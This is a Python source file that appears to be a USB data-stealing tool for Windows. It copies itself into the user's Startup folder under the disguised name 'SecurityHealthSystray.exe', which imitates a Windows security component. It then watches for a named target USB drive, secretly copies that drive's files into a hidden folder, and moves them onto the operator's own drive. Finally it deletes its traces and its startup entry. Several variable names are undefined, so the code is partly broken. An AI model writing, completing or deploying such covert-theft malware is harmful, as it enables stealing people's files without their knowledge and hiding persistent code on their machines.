import ctypes
import shutil
import sys
import os





def checkUpFiles():
    global file_exists

    target_loc = host_loc+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

    try:
        startup_files = os.listdir(target_loc)
        file_name = "SecurityHealthSystray.exe"

        if(file_name in startup_files):
            file_exists = True

        else:
            file_exists = False

    except Exception:
        sys.exit()


def moveFileToStartUp():
    target_loc = host_loc + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

    try:
        shutil.move("SecurityHealthSystray.exe", target_loc)

    except Exception:
        sys.exit()


def DestroyAll():
    try:
        shutil.rmtree(host_loc+"/Documents/Files")
    except Exception:
        sys.exit()

    try:
        os.remove(host_loc+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/SecurityHealthSystray.exe")
    except Exception:
        sys.exit()

    sys.exit()





class USBInserted:
    def createFolderToHideFiles():
        try:
            loc = host_loc + "/Documents/"
            os.mkdir(loc + "Files")

        except Exception:
            sys.exit()


    def CopyFilesToFolder():
        usb_location = usb_driver+":/"
        usb_files = os.listdir(usb_location)
        target_location = host_loc+"Documents/Files/"

        for i in usb_files:
            file = usb_direction+i

            if(os.path.isdir(file) == True):
                try:
                    shutil.copytree(file, target_location, dirs_exist_ok=True)
                except Exception:
                    sys.exit()

            else:
                try:
                    shutil.copy2(file, target_location)
                except Exception:
                    sys.exit()


    def WaitForMainUSB():
        global MainUSB, main_usb_driver
        MainUSB = "YOUR USB'S NAME"
        main_usb_driver = ""
        charachters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        USBFound = True

        while USBFound:
            for i in charachters:
                try:
                    kernel32 = ctypes.windll.kernel32
                    volumeNameBuffer = ctypes.create_unicode_buffer(1024)
                    fileSystemNameBuffer = ctypes.create_unicode_buffer(1024)
                    serial_number, max_component_length, file_system_flags = None, None, None
                    rc = kernel32.GetVolumeInformationW(ctypes.c_wchar_p(i+":\\"), volumeNameBuffer,
                                                        ctypes.sizeof(volumeNameBuffer), serial_number, max_component_length,
                                                        file_system_flags, fileSystemNameBuffer,ctypes.sizeof(fileSystemNameBuffer))

                    if (volumeNameBuffer.value == MainUSB):
                        main_usb_driver = i
                        USBFound = False
                    else:
                        pass

                except Exception:
                    sys.exit()


    def MoveTargetFilesToMainUSB():
        usb_location = main_usb_driver+":/"
        usb_files = os.listdir(main_usb_location)
        target_location = usb_location

        for i in usb_files:
            file = main_usb_direction+i

            try:
                shutil.move(file, target_location)
            except Exception:
                sys.exit()





class USB:
    def Wait():
        global targetUSB, usb_driver
        targetUSB = "TARGET USB'S NAME"
        usb_driver = ""
        charachters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        USBFound = True

        while USBFound:
            for i in charachters:
                try:
                    kernel32 = ctypes.windll.kernel32
                    volumeNameBuffer = ctypes.create_unicode_buffer(1024)
                    fileSystemNameBuffer = ctypes.create_unicode_buffer(1024)
                    serial_number, max_component_length, file_system_flags = None, None, None
                    rc = kernel32.GetVolumeInformationW(ctypes.c_wchar_p(i+":\\"), volumeNameBuffer,
                                                        ctypes.sizeof(volumeNameBuffer), serial_number, max_component_length,
                                                        file_system_flags, fileSystemNameBuffer,ctypes.sizeof(fileSystemNameBuffer))

                    if (volumeNameBuffer.value == targetUSB):
                        usb_driver = i
                        USBFound = False
                    else:
                        pass

                except Exception:
                    sys.exit()

        USB.Inserted()


    def Inserted():
        USBInserted.createFolderToHideFiles()
        USBInserted.CopyFilesToFolder()
        ############
        USBInserted.WaitForMainUSB() #YOURS
        USBInserted.MoveTargetFilesToMainUSB()
        DestroyAll()





if(__name__ == '__main__'):
    global host_loc
    global file_exists

    host_loc = os.path.expanduser('~')
    file_exists = None

    checkUpFiles()

    if(file_exists == True):
        USB.Wait()

    elif(file_exists == False):
        moveFileToStartUp()
        USB.Wait()